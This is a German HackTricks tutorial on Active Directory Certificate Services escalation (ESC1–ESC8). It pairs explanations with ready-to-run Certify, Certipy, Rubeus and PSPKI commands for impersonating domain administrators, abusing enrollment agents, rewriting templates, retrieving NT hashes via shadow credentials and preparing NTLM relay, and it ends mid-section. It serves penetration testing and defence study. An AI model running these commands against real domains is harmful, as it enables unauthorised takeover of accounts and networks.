# AD CS Domänen-Eskalation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Dies ist eine Zusammenfassung der Eskalationstechnikabschnitte der Beiträge:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Zertifikatvorlagen - ESC1

### Erklärung

### Fehlkonfigurierte Zertifikatvorlagen - ESC1 erklärt

* **Anmeldeberechtigungen werden von der Enterprise-CA an Benutzer mit niedrigen Berechtigungen erteilt.**
* **Managergenehmigung ist nicht erforderlich.**
* **Es sind keine Signaturen von autorisiertem Personal erforderlich.**
* **Sicherheitsdeskriptoren auf Zertifikatvorlagen sind übermäßig freizügig konfiguriert, was Benutzern mit niedrigen Berechtigungen ermöglicht, Anmeldeberechtigungen zu erhalten.**
* **Zertifikatvorlagen sind so konfiguriert, dass sie EKUs definieren, die die Authentifizierung erleichtern:**
* Erweiterte Schlüsselverwendung (EKU)-Bezeichner wie Client-Authentifizierung (OID 1.3.6.1.5.5.7.3.2), PKINIT-Client-Authentifizierung (1.3.6.1.5.2.3.4), Smartcard-Login (OID 1.3.6.1.4.1.311.20.2.2), Jeder Zweck (OID 2.5.29.37.0) oder keine EKU (SubCA) sind enthalten.
* **Die Möglichkeit für Antragsteller, einen subjectAltName im Zertifikatanforderung (CSR) einzuschließen, ist durch die Vorlage erlaubt:**
* Das Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat zur Identitätsüberprüfung, wenn er vorhanden ist. Dies bedeutet, dass durch Angabe des SAN in einem CSR ein Zertifikat angefordert werden kann, um sich als beliebiger Benutzer (z. B. ein Domänenadministrator) auszugeben. Ob ein SAN vom Antragsteller angegeben werden kann, wird im AD-Objekt der Zertifikatvorlage durch die Eigenschaft `mspki-certificate-name-flag` angezeigt. Diese Eigenschaft ist ein Bitmask und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt die Angabe des SAN durch den Antragsteller.

{% hint style="danger" %}
Die hier beschriebene Konfiguration ermöglicht es Benutzern mit niedrigen Berechtigungen, Zertifikate mit einem beliebigen SAN ihrer Wahl anzufordern, was die Authentifizierung als beliebigen Domänenprinzipal über Kerberos oder SChannel ermöglicht.
{% endhint %}

Diese Funktion wird manchmal aktiviert, um die Echtzeitgenerierung von HTTPS- oder Hostzertifikaten durch Produkte oder Bereitstellungsdienste zu unterstützen oder aufgrund eines Mangels an Verständnis.

Es wird darauf hingewiesen, dass das Erstellen eines Zertifikats mit dieser Option eine Warnung auslöst, was nicht der Fall ist, wenn eine vorhandene Zertifikatvorlage (wie die `WebServer`-Vorlage, bei der `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und dann modifiziert wird, um eine Authentifizierungs-OID einzuschließen.

### Missbrauch

Um **anfällige Zertifikatvorlagen zu finden**, können Sie ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um **diese Schwachstelle zu missbrauchen und sich als Administrator auszugeben**, könnte man Folgendes ausführen:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dann können Sie das generierte **Zertifikat in das Format `.pfx`** umwandeln und es erneut zur **Authentifizierung mit Rubeus oder certipy** verwenden:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binärdateien "Certreq.exe" & "Certutil.exe" können verwendet werden, um das PFX zu generieren: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Auflistung von Zertifikatvorlagen im Konfigurationsschema des AD-Forest, insbesondere solche, die keine Genehmigung oder Signaturen erfordern, die über eine Client-Authentifizierung oder Smart-Card-Logon-EKU verfügen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist, kann durch Ausführen der folgenden LDAP-Abfrage durchgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Zertifikatvorlagen - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variation des ersten:

1. Anmeldeberechtigungen werden von der Enterprise-CA an Benutzer mit niedrigen Berechtigungen erteilt.
2. Die Anforderung an die Genehmigung durch den Manager ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen wird ausgelassen.
4. Ein übermäßig freigebiger Sicherheitsdeskriptor auf der Zertifikatvorlage gewährt Benutzern mit niedrigen Berechtigungen Zertifikatsanmeldeberechtigungen.
5. **Die Zertifikatvorlage ist definiert, um das EKU für jeden Zweck oder kein EKU einzuschließen.**

Das **EKU für jeden Zweck** erlaubt es einem Angreifer, ein Zertifikat für **jeden Zweck** zu erhalten, einschließlich der Clientauthentifizierung, Serverauthentifizierung, Codesignierung usw. Die gleiche **Technik wie bei ESC3** kann verwendet werden, um dieses Szenario auszunutzen.

Zertifikate ohne **EKUs**, die als untergeordnete CA-Zertifikate fungieren, können für **jeden Zweck** ausgenutzt werden und können auch verwendet werden, um neue Zertifikate zu signieren. Daher könnte ein Angreifer beliebige EKUs oder Felder in den neuen Zertifikaten angeben, indem er ein untergeordnetes CA-Zertifikat verwendet.

Jedoch werden neue Zertifikate, die für die **Domänenauthentifizierung** erstellt wurden, nicht funktionieren, wenn die untergeordnete CA nicht vom Objekt **`NTAuthCertificates`** vertraut wird, was die Standardeinstellung ist. Dennoch kann ein Angreifer weiterhin **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten potenziell für eine Vielzahl von Zwecken missbraucht werden (z. B. Codesignierung, Serverauthentifizierung usw.) und könnten erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.

Um Vorlagen zu ermitteln, die dieses Szenario im Konfigurationsschema des AD-Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Antragsteller-Vorlagen - ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, missbraucht jedoch eine **andere EKU** (Zertifikatsanforderungs-Agent) und **2 verschiedene Vorlagen** (daher hat es 2 Anforderungssets).

Die **Zertifikatsanforderungs-Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekannt als **Enrollment Agent** in der Microsoft-Dokumentation, ermöglicht es einem Prinzipal, sich **im Namen eines anderen Benutzers** für ein Zertifikat **anzumelden**.

Der **"Enrollment Agent"** meldet sich in einer solchen **Vorlage an** und verwendet das resultierende Zertifikat, um im Namen des anderen Benutzers eine CSR mitzuunterschreiben. Anschließend **sendet** er die **mitunterschriebene CSR** an die CA, meldet sich in einer **Vorlage an, die "Anmelden im Namen von" erlaubt**, und die CA antwortet mit einem Zertifikat, das dem "anderen" Benutzer gehört.

**Anforderungen 1:**

* Anmeldeberechtigungen werden von der Enterprise-CA an Benutzer mit niedrigen Berechtigungen erteilt.
* Die Anforderung für die Genehmigung durch den Manager wird ausgelassen.
* Keine Anforderung für autorisierte Signaturen.
* Der Sicherheitsdeskriptor der Zertifikatsvorlage ist übermäßig freizügig und gewährt Anmeldeberechtigungen an Benutzer mit niedrigen Berechtigungen.
* Die Zertifikatsvorlage enthält die Zertifikatsanforderungs-Agent EKU, die die Anforderung anderer Zertifikatsvorlagen im Namen anderer Prinzipale ermöglicht.

**Anforderungen 2:**

* Die Enterprise-CA gewährt Anmeldeberechtigungen an Benutzer mit niedrigen Berechtigungen.
* Die Genehmigung durch den Manager wird umgangen.
* Die Schemaversion der Vorlage ist entweder 1 oder überschreitet 2 und gibt eine Anwendungsrichtlinien-Ausgabeanforderung an, die die Zertifikatsanforderungs-Agent EKU erfordert.
* Eine in der Zertifikatsvorlage definierte EKU ermöglicht die Domänenauthentifizierung.
* Einschränkungen für Anmeldeagenten werden auf der CA nicht angewendet.

### Missbrauch

Sie können [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario zu missbrauchen:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die berechtigt sind, ein **Antragstellerzertifikat** zu **erhalten**, die Vorlagen, in denen Antragsteller zur Anmeldung berechtigt sind, und die **Konten**, für die der Antragsteller handeln darf, können von Unternehmens-CAs eingeschränkt werden. Dies wird erreicht, indem Sie das `certsrc.msc` **Snap-In** öffnen, mit der rechten Maustaste auf die CA **klicken**, auf Eigenschaften **klicken** und dann zum Tab "Antragsteller zur Anmeldung" **navigieren**.

Es ist jedoch zu beachten, dass die **Standard**einstellung für CAs "Anmeldung von Antragstellern nicht einschränken" ist. Wenn die Einschränkung für Antragsteller von Administratoren aktiviert wird, bleibt die Standardkonfiguration äußerst freizügig. Sie erlaubt **Jedermann** den Zugriff auf die Anmeldung in allen Vorlagen als jeder.

## Anfällige Zugriffssteuerung für Zertifikatvorlagen - ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** auf **Zertifikatvorlagen** definiert die **Berechtigungen**, die bestimmte **AD-Prinzipale** bezüglich der Vorlage besitzen.

Sollte ein **Angreifer** die erforderlichen **Berechtigungen** besitzen, um eine **Vorlage** zu **ändern** und **ausnutzbare Fehlkonfigurationen** aus **vorherigen Abschnitten** einzurichten, könnte eine Privilegieneskalation ermöglicht werden.

Bemerkenswerte Berechtigungen, die auf Zertifikatvorlagen anwendbar sind, umfassen:

* **Besitzer:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
* **Vollzugriff:** Ermöglicht vollständige Autorität über das Objekt, einschließlich der Fähigkeit, beliebige Attribute zu ändern.
* **WriteOwner:** Erlaubt die Änderung des Besitzers des Objekts zu einem Prinzipal unter der Kontrolle des Angreifers.
* **WriteDacl:** Ermöglicht die Anpassung von Zugriffssteuerungen und gewährt möglicherweise einem Angreifer Vollzugriff.
* **WriteProperty:** Ermächtigt die Bearbeitung beliebiger Objekteigenschaften.

### Missbrauch

Ein Beispiel für eine Privilegieneskalation wie die vorherige:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4 tritt auf, wenn ein Benutzer Schreibberechtigungen über eine Zertifikatvorlage hat. Dies kann beispielsweise missbraucht werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und die Vorlage anfällig für ESC1 zu machen.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` hat die neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist. Hier ist ein kleiner Einblick in den `shadow auto`-Befehl von Certipy zur Abrufung des NT-Hash des Opfers.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. Standardmäßig wird Certipy die Konfiguration überschreiben, um sie anfällig für ESC1 zu machen. Wir können auch den `-save-old`-Parameter angeben, um die alte Konfiguration zu speichern, was nützlich sein wird, um die Konfiguration nach unserem Angriff wiederherzustellen.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Anfällige PKI-Objektzugriffskontrolle - ESC5

### Erklärung

Das umfangreiche Netzwerk von miteinander verbundenen ACL-basierten Beziehungen, das neben Zertifikatvorlagen und der Zertifizierungsstelle mehrere Objekte umfasst, kann die Sicherheit des gesamten AD CS-Systems beeinträchtigen. Diese Objekte, die die Sicherheit erheblich beeinflussen können, umfassen:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes nachgeordnete AD-Objekt oder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Zertifikatvorlagen-Container, den Zertifizierungsstellen-Container, das NTAuthCertificates-Objekt und den Container für Anmeldedienste.

Die Sicherheit des PKI-Systems kann gefährdet sein, wenn ein wenig privilegierter Angreifer die Kontrolle über eine dieser kritischen Komponenten erlangt.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erklärung

Das Thema, das im [**CQure Academy-Beitrag**](https://cqureacademy.com/blog/enhanced-key-usage) diskutiert wird, berührt auch die Auswirkungen der Flagge **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, wie von Microsoft dargelegt. Diese Konfiguration, wenn sie auf einer Zertifizierungsstelle (CA) aktiviert ist, erlaubt die Aufnahme von **benutzerdefinierten Werten** im **alternativen Subjektnamen** für **jede Anforderung**, einschließlich solcher, die aus Active Directory® erstellt wurden. Folglich ermöglicht diese Bestimmung einem **Eindringling**, sich über **jede Vorlage** für die Domänenauthentifizierung einzuschreiben - insbesondere solche, die für die Einschreibung von **nicht privilegierten** Benutzern offen sind, wie die Standardbenutzervorlage. Dadurch kann ein Zertifikat gesichert werden, das es dem Eindringling ermöglicht, sich als Domänenadministrator oder **eine andere aktive Entität** innerhalb der Domäne zu authentifizieren.

**Hinweis**: Der Ansatz zum Anhängen von **alternativen Namen** zu einem Zertifikatanforderung (CSR) durch das Argument `-attrib "SAN:"` in `certreq.exe` (bezeichnet als "Name-Wert-Paare") stellt einen **Kontrast** zur Ausnutzungsstrategie von SANs in ESC1 dar. Hier liegt der Unterschied darin, wie Kontoinformationen **verkapselt** werden - innerhalb eines Zertifikatsattributs anstelle einer Erweiterung.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Diese Operation nutzt im Wesentlichen den **Remote-Registrierungszugriff**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Werkzeuge wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) sind in der Lage, diese Fehlkonfiguration zu erkennen und auszunutzen:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, vorausgesetzt man besitzt **Domänenadministrationsrechte** oder äquivalent, kann der folgende Befehl von jedem Arbeitsplatz ausgeführt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann die Flagge mit dem folgenden Befehl entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Nach den Sicherheitsupdates im Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die **`objectSid`-Eigenschaft des Antragstellers** integriert. Für ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Für **ESC6** spiegelt die SID jedoch die **`objectSid` des Antragstellers** wider, nicht den SAN.\
Um ESC6 auszunutzen, ist es entscheidend, dass das System anfällig für ESC10 (Schwache Zertifikat-Zuordnungen) ist, das den **SAN über die neue Sicherheitserweiterung priorisiert**.
{% endhint %}

## Anfällige Zugriffskontrolle für Zertifizierungsstellen - ESC7

### Angriff 1

#### Erklärung

Der Zugriff auf eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen geregelt, die CA-Aktionen steuern. Diese Berechtigungen können eingesehen werden, indem Sie auf `certsrv.msc` zugreifen, mit der rechten Maustaste auf eine CA klicken, Eigenschaften auswählen und dann zum Sicherheits-Tab navigieren. Darüber hinaus können Berechtigungen mithilfe des PSPKI-Moduls mit Befehlen wie folgt aufgelistet werden:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies bietet Einblicke in die primären Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen "CA-Administrator" bzw. "Zertifikatsmanager" entsprechen.

#### Missbrauch

Das Vorhandensein von **`ManageCA`**-Rechten bei einer Zertifizierungsstelle ermöglicht es dem Prinzipal, Einstellungen remote über PSPKI zu manipulieren. Dies umfasst das Umschalten des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die SAN-Spezifikation in jedem Template zu ermöglichen, ein entscheidender Aspekt der Domänenescalation.

Die Vereinfachung dieses Prozesses ist durch die Verwendung des Cmdlets **Enable-PolicyModuleFlag** von PSPKI möglich, was Modifikationen ohne direkte GUI-Interaktion erlaubt.

Der Besitz von **`ManageCertificates`**-Rechten erleichtert die Genehmigung ausstehender Anfragen und umgeht effektiv die Sicherheitsvorkehrung "Genehmigung durch den CA-Zertifikatsmanager".

Eine Kombination der Module **Certify** und **PSPKI** kann genutzt werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

{% hint style="warning" %}
Im **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um die **EDITF\_ATTRIBUTESUBJECTALTNAME2**-Flagge zu aktivieren und den **ESC6-Angriff** durchzuführen. Dies hat jedoch keine Auswirkungen, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer das Zugriffsrecht `Manage CA` hat, darf der Benutzer auch **den Dienst neu starten**. Dies bedeutet jedoch **nicht**, dass der Benutzer den Dienst aus der Ferne neu starten kann. Darüber hinaus funktioniert **ESC6** in den meisten gepatchten Umgebungen aufgrund der Sicherheitsupdates vom Mai 2022 **möglicherweise nicht sofort**.
{% endhint %}

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

* Nur **`ManageCA`-Berechtigung**
* **`Manage Certificates`-Berechtigung** (kann von **`ManageCA`** gewährt werden)
* Zertifikatvorlage **`SubCA`** muss **aktiviert** sein (kann von **`ManageCA`** aktiviert werden)

Die Technik beruht darauf, dass Benutzer mit dem Zugriffsrecht `Manage CA` _und_ `Manage Certificates` das **Ausstellen fehlgeschlagener Zertifikatsanfragen** können. Die Zertifikatvorlage **`SubCA`** ist **anfällig für ESC1**, aber **nur Administratoren** können sich in der Vorlage einschreiben. Daher kann ein **Benutzer** beantragen, sich in der **`SubCA`** einzuschreiben - was **abgelehnt** wird - aber **dann vom Manager ausgestellt wird**.

#### Missbrauch

Sie können sich das Zugriffsrecht **`Manage Certificates`** gewähren, indem Sie Ihren Benutzer als neuen Offizier hinzufügen.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** Vorlage kann mit dem `-enable-template` Parameter auf dem CA **aktiviert werden**. Standardmäßig ist die `SubCA` Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir damit beginnen, **ein Zertifikat basierend auf der `SubCA`-Vorlage anzufordern**.

**Dieser Antrag wird abgelehnt**, aber wir werden den privaten Schlüssel speichern und die Anfrage-ID notieren.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unserem **`Manage CA` und `Manage Certificates`** können wir dann **den fehlgeschlagenen Zertifikatsantrag** mit dem `ca` Befehl und dem `-issue-request <Anforderungs-ID>` Parameter ausstellen.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir das ausgestellte Zertifikat mit dem `req`-Befehl und dem Parameter `-retrieve <Anforderungs-ID>` abrufen.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM-Relais zu AD CS HTTP-Endpunkten – ESC8

### Erklärung

{% hint style="info" %}
In Umgebungen, in denen **AD CS installiert ist**, besteht die Möglichkeit, dass ein **Web-Registrierungsendpunkt verwundbar ist** und mindestens eine **Zertifikatvorlage veröffentlicht ist**, die **die Registrierung von Domänencomputern und die Clientauthentifizierung zulässt** (wie z.B. die Standardvorlage **`Machine`**), dass **jeder Computer mit aktivem Spooler-Dienst von einem Angreifer kompromittiert werden kann**!
{% endhint %}

AD CS unterstützt mehrere **HTTP-basierte Registrierungsmethoden**, die über zusätzliche Serverrollen verfügbar sind, die Administratoren installieren können. Diese Schnittstellen für die HTTP-basierte Zertifikatsregistrierung sind anfällig für **NTLM-Relaisangriffe**. Ein Angreifer kann von einem **kompromittierten Rechner aus** jede AD-Konto nachahmen, das über eingehendes NTLM authentifiziert. Während er das Opferkonto nachahmt, kann ein Angreifer auf diese Webschnittstellen zugreifen, um **ein Clientauthentifizierungszertifikat unter Verwendung der Zertifikatvorlagen `User` oder `Machine` anzufordern**.

* Die **Web-Registrierungsschnittstelle** (eine ältere ASP-Anwendung, die unter `http://<caserver>/certsrv/` verfügbar ist), ist standardmäßig nur für HTTP verfügbar, was keinen Schutz vor NTLM-Relaisangriffen bietet. Darüber hinaus erlaubt sie explizit nur die NTLM-Authentifizierung über ihren Autorisierungs-HTTP-Header, wodurch sicherere Authentifizierungsmethoden wie Kerberos unanwendbar sind.
* Der **Zertifikatsregistrierungsdienst** (CES), der **Zertifikatsregistrierungsrichtlinie** (CEP) Webdienst und der **Netzwerkgeräteregistrierungsdienst** (NDES) unterstützen standardmäßig die Verhandlungsauthentifizierung über ihren Autorisierungs-HTTP-Header. Die Verhandlungsauthentifizierung unterstützt sowohl Kerberos als auch **NTLM**, was einem Angreifer ermöglicht, während Relaisangriffen auf **NTLM herabzustufen**. Obwohl diese Webservices standardmäßig HTTPS unterstützen, bietet HTTPS allein keinen Schutz vor NTLM-Relaisangriffen. Der Schutz vor NTLM-Relaisangriffen für HTTPS-Dienste ist nur möglich, wenn HTTPS mit Kanalbindung kombiniert wird. Bedauerlicherweise aktiviert AD CS nicht den erweiterten Schutz für die Authentifizierung auf IIS, der für die Kanalbindung erforderlich ist.

Ein häufiges **Problem** bei NTLM-Relaisangriffen ist die **kurze Dauer von NTLM-Sitzungen** und die Unfähigkeit des Angreifers, mit Diensten zu interagieren, die **NTLM-Signierung erfordern**.

Diese Einschränkung wird jedoch durch die Ausnutzung eines NTLM-Relaisangriffs überwunden, um ein Zertifikat für den Benutzer zu erhalten, da die Gültigkeitsdauer des Zertifikats die Dauer der Sitzung bestimmt und das Zertifikat mit Diensten verwendet werden kann, die **NTLM-Signierung erfordern**. Für Anweisungen zur Verwendung eines gestohlenen Zertifikats siehe:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Eine weitere Einschränkung von NTLM-Relaisangriffen besteht darin, dass **ein von einem Angreifer kontrollierter Rechner von einem Opferkonto authentifiziert werden muss**. Der Angreifer könnte entweder warten oder versuchen, diese Authentifizierung zu **erzwingen**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Missbrauch**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` listet **aktivierte HTTP AD CS-Endpunkte** auf:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Unternehmenszertifizierungsstellen (CAs) verwendet, um Endpunkte des Zertifikatanforderungsdienstes (CES) zu speichern. Diese Endpunkte können analysiert und aufgelistet werden, indem das Tool **Certutil.exe** verwendet wird:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
